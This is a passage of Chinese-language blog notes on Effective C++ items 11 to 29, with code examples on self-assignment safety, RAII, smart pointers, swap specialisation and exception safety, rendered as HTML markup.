class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bitmap</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Bitmap *bp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Widget &amp;Widget::<span class="keyword">operator</span>=(<span class="keyword">const</span> Widget&amp; rhs) &#123;  <span class="comment">// 一份看似合理的赋值运算符的实现</span></span><br><span class="line">    <span class="keyword">delete</span> bp;                                  <span class="comment">// 如果是自己给自己赋值呢？类似 wi = wi ？     </span></span><br><span class="line">    bp = <span class="keyword">new</span> <span class="built_in">Bitmap</span>(*rhs.bp);                   <span class="comment">// 显然会发生 UAF !</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1、自我赋值安全的实现方式</strong></p><p>以下方式虽然可以实现自我赋值的安全，但无法实现异常安全。如果在 new 操作符中发生异常（可能分配内存失败，也可能 Bitmap 的 copy 构造函数抛出异常），widget 会持有一个指针指向一块被删除的 Bitmap，这样的指针是有害的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bitmap</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Bitmap *bp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Widget &amp;Widget::<span class="keyword">operator</span>=(<span class="keyword">const</span> Widget&amp; rhs) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;rhs) <span class="keyword">return</span> *<span class="keyword">this</span>;             <span class="comment">// 如果是自我赋值，就不做任何事</span></span><br><span class="line">    <span class="keyword">delete</span> bp;                                         </span><br><span class="line">    bp = <span class="keyword">new</span> <span class="built_in">Bitmap</span>(*rhs.bp);                   </span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、异常安全的实现方式</strong></p><p>以下方式不仅仅可以实现异常安全，也可以实现自我赋值安全。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bitmap</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Bitmap *bp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Widget &amp;Widget::<span class="keyword">operator</span>=(<span class="keyword">const</span> Widget&amp; rhs) &#123;  </span><br><span class="line">    Bitmap *pOrig = bp;</span><br><span class="line">    bp = <span class="keyword">new</span> <span class="built_in">Bitmap</span>(*rhs.bp);</span><br><span class="line">    <span class="keyword">delete</span> pOrig;                       <span class="comment">// 将删除操作延迟到new操作符之后</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3、copy and swap 技术</strong>（天然就是自我赋值安全和异常安全的）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(Widget &amp; rhs)</span></span>;<span class="comment">// swap函数，交换*this和rhs的数据</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Bitmap *bp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Widget &amp;Widget::<span class="keyword">operator</span>=(<span class="keyword">const</span> Widget&amp; rhs) &#123;  </span><br><span class="line">Widget <span class="built_in">temp</span>(rhs);</span><br><span class="line">    <span class="built_in">swap</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="条款-12：复制对象时勿忘其每一个成分"><a href="#条款-12：复制对象时勿忘其每一个成分" class="headerlink" title="条款 12：复制对象时勿忘其每一个成分"></a>条款 12：复制对象时勿忘其每一个成分</h3><p>Copying 函数应该确保复制“对象内的所有成员变量”及“所有 base class 成分”。这听起来容易，但在工程中常犯的一种错误就是，用户完美的自定义了拷贝构造函数和拷贝赋值运算符，但在日后的开发维护中，<strong>可能在类中添加新的成员变量，但是却忘记同时更新拷贝构造函数和拷贝赋值运算符了，导致在发生拷贝的时候仅仅进行了局部拷贝（也就是新加入的成员变量没有被拷贝过去）</strong>。而任何时候只要你承担起“为 derived class 撰写 copying 函数”的重责大任，必须很小心地也复制其 base class 成分。那些成分往往是 private，所以你无法直接访问它们，你应该让 derived class 的 copying 函数调用相应的 base class 函数。</p><hr><h3 id="条款-13：以对象管理资源"><a href="#条款-13：以对象管理资源" class="headerlink" title="条款 13：以对象管理资源"></a>条款 13：以对象管理资源</h3><p>这一条款最主要的阐述为什么要用对象来管理资源，也是 RAII 的概念，也就是 C++11 中为什么会出现智能指针的原因。</p><p>这一条款指出了<strong>智能指针并不能管理动态分配的数组，因为其内部采用的是 delete 而不是 delete [] 动作</strong>。而在 C++11 的智能指针中，其实也是有相应的办法解决这个问题的，就是可以自定义一个删除器，将其传入到智能指针中。</p><hr><h3 id="条款-14：在资源管理类中小心-coping-行为"><a href="#条款-14：在资源管理类中小心-coping-行为" class="headerlink" title="条款 14：在资源管理类中小心 coping 行为"></a>条款 14：在资源管理类中小心 coping 行为</h3><p>对于智能指针来说，RAII 思想主要还是体现在堆分配的内存空间上，然而有些资源其并不是内存资源，所以可能需要<strong>用户来建立</strong>资源管理类。</p><p>比如说，假设我们在线程安全设计中有两个处理类型为 Mutex 的互斥器对象，共有两个函数 lock 和 unlock 可以用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">(Mutex *pm)</span></span>; <span class="comment">// 上锁</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">(Mutex *pm)</span></span>;<span class="comment">// 解锁</span></span><br></pre></td></tr></table></figure><p>为了确保不会忘记将一个锁住的 Mutex 解锁，可能会希望建立一个 class 来管理锁：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lock</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">Lock</span><span class="params">(Mutex *pm)</span> : mutexPtr(pm) &#123;</span></span><br><span class="line">        <span class="built_in">lock</span>(mutexPtr);<span class="comment">// 获得资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Lock</span>() &#123; <span class="built_in">unlock</span>(mutexPtr);&#125;<span class="comment">// 释放资源</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Mutex *mutexPtr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户代码</span></span><br><span class="line">Mutex m;</span><br><span class="line">...</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">Lock <span class="title">ml</span><span class="params">(&amp;m)</span></span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述是 Lock 对象正确的使用，但是如果 Lock 对象被复制，会发生什么？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Lock <span class="title">ml1</span><span class="params">(&amp;m)</span></span>;</span><br><span class="line"><span class="function">Lock <span class="title">ml2</span><span class="params">(ml1)</span></span>;</span><br></pre></td></tr></table></figure><p>这显然会有问题，在 ml1 析构的时候已经调用了 unlock 函数解锁，则 ml2 析构的时候会导致 unlock 函数对同一个 Mutex 进行解锁，这显然会导致问题（类似于 Double Free）。</p><p>如何解决这个问题：</p><ul><li>禁止复制。</li><li>对底层资源祭出 “引用计数法”。<br>对于上述的 Lock 类，我们可以改写如下：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lock</span>&#123;</span></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">explicit</span> <span class="title">Lock</span><span class="params">(Mutex *pm)</span> : mutexPtr(pm, unlock) &#123;</span><span class="comment">// 以某个 Mutex 初始化 shared_ptr, 并且用 unlock 作为删除器</span></span><br><span class="line">          <span class="built_in">lock</span>(mutexPtr.<span class="built_in">get</span>());</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">      std::shared_ptr&lt;Mutex&gt; mutexPtr;</span><br><span class="line">  &#125;；</span><br></pre></td></tr></table></figure></li><li>复制底层资源（深度拷贝）。</li><li>转移底部资源的所有权。</li></ul><hr><h3 id="条款-15：在资源管理类中提供对原始资源的访问"><a href="#条款-15：在资源管理类中提供对原始资源的访问" class="headerlink" title="条款 15：在资源管理类中提供对原始资源的访问"></a>条款 15：在资源管理类中提供对原始资源的访问</h3><p>APIs 往往要求访问原始资源，所以每一个 RAII class 应该提供一个 “取得其所管理之资源” 的办法。</p><p>对原始资源的访问可以通过显示转换或隐式转换来完成。一般而言显式转换比较安全，但隐式转换对客户比较方便。</p><hr><h3 id="条款-16：成对使用-new-和-delete-时要采用相同形式"><a href="#条款-16：成对使用-new-和-delete-时要采用相同形式" class="headerlink" title="条款 16：成对使用 new 和 delete 时要采用相同形式"></a>条款 16：成对使用 new 和 delete 时要采用相同形式</h3><p>如果你在 new 表达式中使用 []，必须在相应的 delete 表达式中也使用 []。如果你在 new 表达式中不使用 []，一定不要在相应的 delete 表达式中使用 []。</p><hr><h3 id="条款-17：-以独立语句将-newed-对象置入智能指针"><a href="#条款-17：-以独立语句将-newed-对象置入智能指针" class="headerlink" title="条款 17： 以独立语句将 newed 对象置入智能指针"></a>条款 17： 以独立语句将 newed 对象置入智能指针</h3><p>假设有如下两个函数接口：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">priority</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">processWidget</span><span class="params">(std::shared_ptr&lt;Widget&gt; pw, <span class="keyword">int</span> priority)</span></span>;</span><br></pre></td></tr></table></figure><p>用户代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">processWidget</span>(<span class="keyword">new</span> Widget， <span class="built_in">priority</span>());<span class="comment">// 编译出错，因为 shared_ptr 是 explicit 的</span></span><br><span class="line"><span class="built_in">processWidget</span>(std::shared_ptr&lt;Widget&gt;(<span class="keyword">new</span> Widget), <span class="built_in">priority</span>());<span class="comment">// 编译通过，但是仍然有问题</span></span><br></pre></td></tr></table></figure><p>对于上述的第二种用法，仍然可能存在<strong>资源泄露</strong>！！！</p><p>在编译器生成代码的时候，首先要生成对实参处理的生成代码，所以在调用 processWidget 函数之前，编译器应该先做三件事：</p><ul><li>调用 priority 函数；</li><li>执行 “new Widget”；</li><li>调用 std::shared_ptr 构造函数。</li></ul><p>但是 C++ 的编译器会按照什么样的次序完成这些事情呢？可能如下：</p><ol><li>执行 “new Widget”；</li><li>调用 priority 函数；</li><li>调用 std::shared_ptr 构造函数。</li></ol><p>这就有问题了，因为 priority 可能抛出异常，这样则会导致资源泄露。</p><p><strong>正确的处理方式：以独立语句将 newed 对象置入智能指针</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::shared_ptr&lt;widget&gt; <span class="title">pw</span><span class="params">(<span class="keyword">new</span> Widget)</span></span>;</span><br><span class="line"><span class="built_in">processWidget</span>(pw, <span class="built_in">priority</span>());</span><br></pre></td></tr></table></figure><hr><h3 id="条款-18：让接口容易被正确使用，不易被误用"><a href="#条款-18：让接口容易被正确使用，不易被误用" class="headerlink" title="条款 18：让接口容易被正确使用，不易被误用"></a>条款 18：让接口容易被正确使用，不易被误用</h3><p><strong>如何阻止误用</strong>：建立新的类型，限制类型上的操作，束缚对象值，消除客户的资源管理责任。</p><p><code>cross-DLL problem</code>：对象在动态链接程序库（DLL）中被创建，却在另一个 DLL 内被 delete 销毁。<strong>解决方案</strong>：采用智能指针替换，因为智能指针的缺省的删除器是来自其所诞生的那个 DLL。</p><hr><h3 id="条款-19：设计-class-犹如设计-type"><a href="#条款-19：设计-class-犹如设计-type" class="headerlink" title="条款 19：设计 class 犹如设计 type"></a>条款 19：设计 class 犹如设计 type</h3><p>通常要考虑如下问题：</p><ul><li>新 type 的对象应该如何被创建和销毁</li><li>对象的初始化和对象的赋值该有什么样的差别？</li><li>新 type 的对象如果被 <em>passed by value</em> ，意味着什么？</li><li>什么是新 type 的合法值？</li><li>你的新 type 需要配合某个继承图系吗？</li><li>你的新 type 需要什么样的转换？</li><li>什么样的操作符和函数对此新 type 而言是合理的？</li><li>什么样的标准函数应该驳回？</li><li>谁该取用新 type 的成员？</li><li>什么是新 type 的 “未声明接口”？</li><li>你的新 type 有多么的一般化？</li><li>你真的需要一个新 type 吗？</li></ul><hr><h3 id="条款-20：宁以-pass-by-reference-to-const-替换-pass-by-value"><a href="#条款-20：宁以-pass-by-reference-to-const-替换-pass-by-value" class="headerlink" title="条款 20：宁以 pass-by-reference-to-const 替换 pass-by-value"></a>条款 20：宁以 pass-by-reference-to-const 替换 pass-by-value</h3><ul><li>尽量以 pass-by-reference-to-const 替换 pass-by-value。前者通常比较高效，并可避免对象切割问题。</li><li>以上规则不适用于内置类型，以及 STL 的迭代器和函数对象。</li></ul><hr><h3 id="条款-21：必须返回对象时，别妄想返回其-reference"><a href="#条款-21：必须返回对象时，别妄想返回其-reference" class="headerlink" title="条款 21：必须返回对象时，别妄想返回其 reference"></a>条款 21：必须返回对象时，别妄想返回其 reference</h3><p>绝不要返回 pointer 或 reference 指向一个 local stack 对象，或返回 reference 指向一个 heap-allocated 对象，或返回 pointer 或 reference 指向一个 local static 对象且有可能同时需要多个这样的对象。</p><hr><h3 id="条款-22：将成员变量声明为-private"><a href="#条款-22：将成员变量声明为-private" class="headerlink" title="条款 22：将成员变量声明为 private"></a>条款 22：将成员变量声明为 private</h3><p>这可以赋予客户访问数据的一致性、可细微划分访问控制、允许约束条件获得保证、实现封装性等。</p><hr><h3 id="条款-23：宁以-non-member、non-friend-替换-member-函数"><a href="#条款-23：宁以-non-member、non-friend-替换-member-函数" class="headerlink" title="条款 23：宁以 non-member、non-friend 替换 member 函数"></a>条款 23：宁以 non-member、non-friend 替换 member 函数</h3><p>这种做法可以增加封装性（因为非成员函数没法访问 class 的私有成员）、包裹弹性、机能扩充性（用户没法直接修改类，但可以使用类的接口）。</p><hr><h3 id="条款-24：若所有参数皆需类型转换，请为此采用-non-member-函数"><a href="#条款-24：若所有参数皆需类型转换，请为此采用-non-member-函数" class="headerlink" title="条款 24：若所有参数皆需类型转换，请为此采用 non-member 函数"></a>条款 24：若所有参数皆需类型转换，请为此采用 non-member 函数</h3><p>以前在读 C++ Primer 的时候就遇到过类似二元重载运算符，如 operator* 或 operator+ 等都建议写成 non-member 函数，今天终于找到了理由。</p><p>因为当仅仅当参数被列于参数列的时候，这个参数才可以发生隐式转换；如果参数的地位相当于被调用的成员函数所隶属的那个对象 — 也就是 this 对象那个隐含参数，就不能发生隐式转换。所以为了支持带隐式转换的二元运算符（交换律），必须采用 non-member 的方式。</p><hr><h3 id="条款-25：考虑写出一个不抛异常的-swap-函数"><a href="#条款-25：考虑写出一个不抛异常的-swap-函数" class="headerlink" title="条款 25：考虑写出一个不抛异常的 swap 函数"></a>条款 25：考虑写出一个不抛异常的 swap 函数</h3><p>标准库中的 swap 算法实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line">    <span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function">    <span class="keyword">void</span> <span class="title">swap</span><span class="params">(T &amp;a, T &amp;b)</span> </span>&#123;</span><br><span class="line">        <span class="function">T <span class="title">temp</span><span class="params">(a)</span></span>;</span><br><span class="line">        a = b;</span><br><span class="line">        b = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认版本的 swap 的函数在面对某些 class 实现的时候，会表现得效率低下，常见于 <strong>pimpl</strong>（pointer to implementation） 手法的设计中。例如，以这种手法设计 Widget class：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WidgetImpl</span> &#123;</span><span class="comment">// 针对 Widget 数据而设计的 class，可能有许多数据</span></span><br><span class="line"><span class="keyword">public</span>:<span class="comment">// 意味着复制时间很长</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> a, b, c;</span><br><span class="line">    std::vector&lt;<span class="keyword">double</span>&gt; v;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Widget</span>(<span class="keyword">const</span> Widget&amp; rhs);</span><br><span class="line">    Widget&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Widget&amp; rhs) &#123;<span class="comment">//复制 Widget 时，令它复制其 WidgetImpl 对象</span></span><br><span class="line">        ...<span class="comment">//涉及到深拷贝，意味着复制消耗很大</span></span><br><span class="line">        *pImpl = *(rhs.pImpl);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    WidgetImpl* pImpl;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实际上，如果要置换两个 Widget 对象值，我们唯一需要的就是置换其 pImpl 指针，如果调用默认的 swap，则会导致调用到 operator= ，开销很大！！！</p><p><strong>我们需要做的是，当用户调用 std::swap 来置换两个 Widget 的对象时，真正该做的是置换其内部的指针。</strong>正确实现方法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、令 Widget 声明一个名为 swap 的 public 成员函数做真正的置换工作</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(Widget &amp;other)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> std::swap;</span><br><span class="line"><span class="built_in">swap</span>(pImpl, other.pImpl);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">WidgetImpl *pImpl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、全特化 std::swap 函数模板</span></span><br><span class="line"><span class="keyword">namespace</span> std &#123;</span><br><span class="line">    <span class="keyword">template</span>&lt;&gt;</span><br><span class="line">    <span class="keyword">void</span> swap&lt;Widget&gt;( Widget&amp; a, Widget&amp; b ) &#123;</span><br><span class="line">    a.<span class="built_in">swap</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设 Widget 和 WidgetImpl 是 class template 咋办呢？关键在于自定义模板 swap 函数模板！！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> WidgetStuff &#123;</span><br><span class="line"><span class="comment">// 1、同样令 Widget 声明一个名为 swap 的 public 成员函数做真正的置换工作</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(Widget&lt;T&gt; &amp;other)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> std::swap;</span><br><span class="line"><span class="built_in">swap</span>(pImpl, other.pImpl);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">WidgetImpl&lt;T&gt; *pImpl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、定义 WidgetStuff::swap 函数模板</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(Widget&lt;T&gt;&amp; a, Widget&lt;T&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">a.<span class="built_in">swap</span>(b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>为什么对于 class 一般采用全特化的 std::swap，而 class template 却采用自定义的 namespace_name::swap 呢？</strong></p><p>因为 class template 只能采用自定义的方式，毕竟偏特化 std::swap 是超出标准之外的而重载 std::swap 也是不推荐的方式嘛！对于 class 来说，全特化 std::swap 可以使其用于更多的语境（比如某位程序员在写调用 swap 的时候写了 std::swap(a, b) ，这会使得编译器自动去找 std 中的 swap，如果没有采用全特化的方式而是重载的方式，就不会解析到 class 作者定义的 swap 函数了）！！！</p><p><strong>对 std 命名空间的修改原则</strong>：</p><ul><li>可以为标准 template 制造特化版本，使其专属于我们自己的 classes。</li><li>只允许对 class template 偏特化，但不允许对 function template 偏特化（如有需要，增加一个重载版本，但是此方案并不建议）。</li></ul><blockquote><p><strong>定义并高效使用 swap 的规则：</strong></p><p>1、提供一个 public swap 成员函数，让它高效地置换你的类型的两个对象值，这个函数不应该抛出异常。</p><p>2、在你的 class 或 template 所在命名空间内提供一个 non-member swap，并令它调用上述 swap 成员函数。</p><p>3、如果你正在编写一个 class（而非 class template），为你的 class 特化 std::swap，并令它调用你的 swap 成员函数。</p><p>最后如果你调用 swap，请确定包含一个 using 声明式，以便让那 std::swap 在你的函数内曝光可见，然后不加任何 namespace 修饰符，赤裸裸地调用 swap。</p></blockquote><hr><h3 id="条款-26：尽可能延后变量定义式的出现时间"><a href="#条款-26：尽可能延后变量定义式的出现时间" class="headerlink" title="条款 26：尽可能延后变量定义式的出现时间"></a>条款 26：尽可能延后变量定义式的出现时间</h3><p>这样做不仅仅可以增加程序的清晰度，更重要的是减少无效的构造和析构开销。</p><p>循环应该怎么做？</p><ul><li>方法 A：定义于循环外，<strong>1 次构造 +  1 次析构 + n 次赋值操作</strong>。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Widget w;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    w = 取决于 i 的某个值;</span><br><span class="line">    ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>方法 B：定义于循环内，<strong>n 次构造 + n 次析构。</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    <span class="function">Widget <span class="title">w</span><span class="params">( 取决于i 的某个值)</span></span>;</span><br><span class="line">    ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>除非你知道赋值成本比 “构造+析构” 低，同时正在处理代码中高效敏感的部分，否则应该使用方法 B。</p><hr><h3 id="条款-27：尽量少做转型动作"><a href="#条款-27：尽量少做转型动作" class="headerlink" title="条款 27：尽量少做转型动作"></a>条款 27：尽量少做转型动作</h3><p>dynamic_cast 会增大运行时的开销。</p><hr><h3 id="条款-28：避免返回-handle-指向对象内部成分"><a href="#条款-28：避免返回-handle-指向对象内部成分" class="headerlink" title="条款 28：避免返回 handle 指向对象内部成分"></a>条款 28：避免返回 handle 指向对象内部成分</h3><p>增加封装性。所谓 handle 就是指引用、指针或者迭代器。</p><hr><h3 id="条款-29：-为“异常安全”而努力是值得的"><a href="#条款-29：-为“异常安全”而努力是值得的" class="headerlink" title="条款 29： 为“异常安全”而努力是值得的"></a>条款 29： 为“异常安全”而努力是值得的</h3><p>一段异常不安全的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrettyMenu</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">changeBackground</span><span class="params">(std::istream &amp;imgSrc)</span></span>;</span><br><span class="line"><span 